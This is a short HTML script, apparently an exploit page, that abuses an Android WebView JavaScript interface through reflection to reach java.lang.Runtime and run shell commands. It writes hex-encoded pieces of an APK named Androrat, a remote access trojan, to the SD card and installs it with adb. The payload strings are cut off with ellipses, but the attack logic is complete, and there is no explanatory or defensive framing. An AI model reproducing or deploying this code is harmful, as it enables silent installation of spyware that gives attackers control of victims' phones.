<script>
function execute(cmdArgs)
{
return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
} 
 
var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4
 
var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94
 
var armBinary3=…
var armBinary4=…
……
var patharm = "/mnt/sdcard/Androrat.apk";
var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]);
//alert(a);
execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]);
execute(["/system/bin/sh","-c","echo  -n +armBinary3+ >> " + patharm]);
execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]);
execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]);
alert("over !!!");
</script>
